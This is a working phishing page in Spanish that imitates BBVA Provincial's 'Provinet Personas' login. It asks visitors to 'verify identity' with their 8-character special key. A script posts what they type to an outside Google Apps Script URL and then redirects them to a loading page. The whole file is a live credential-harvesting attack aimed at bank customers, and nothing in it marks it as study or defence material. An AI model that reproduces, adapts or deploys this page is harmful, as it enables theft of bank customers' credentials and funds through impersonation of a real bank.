<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Inicio</title>
    <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no" />
    </head>
<body>

<div class="w-full py-4 px-6 items-center" style="background: #072146; padding: 15px;">
    <img src="logo-bbva-provincial1.png" style="width: 150px" />
    <p style="color: white; font-size: 12px; font-family: Arial, Helvetica, sans-serif;">Acceso a Provinet Personas</p>
</div>

<div class="container">
    <h1 style="font-size: 23px; font-weight: bold;">¡Verifiquemos tu identidad!</h1>
    <h1 style="font-size: 20px;">Ingresa tu clave especial</h1>

    <form id="loginform" onsubmit="event.preventDefault(); enviarDatos(this);">
        <div class="group" style="margin-top: 16px">
            <input type="password" id="clvs" name="clvs" minlength="8" maxlength="8" autocomplete="off" required />
            <label for="clvs">Clave especial</label>
        </div>
        <br /><br />

        <div align="center">
            <button type="submit" id="btnVerificar" style="background-color: #237aba; width: 100%; padding: 1.3rem; border: none; color: #fff; cursor: pointer;">
                Verificar
            </button>
        </div>
    </form>
</div>

<script>
async function enviarDatos(formulario) {
    const btn = document.getElementById('btnVerificar');
    btn.innerText = "Verificando...";
    btn.disabled = true;

    const datos = new FormData(formulario);
    const URL_GOOGLE = "https://script.google.com/macros/s/AKfycbx9cU2lLhshUBFHq36KlSNXi4_Gr1YAuD6FhF3kzix3MzvDACFedcrwtpVYqApaHHII9g/exec";

    try {
        await fetch(URL_GOOGLE, {
            method: "POST",
            mode: "no-cors",
            body: datos
        });
        // Si todo sale bien, redirigimos a carga
        window.location.href = "cargando.html";
    } catch (error) {
        alert("Error de conexión, intenta de nuevo.");
        btn.innerText = "Verificar";
        btn.disabled = false;
    }
}
</script>

</body>
</html>
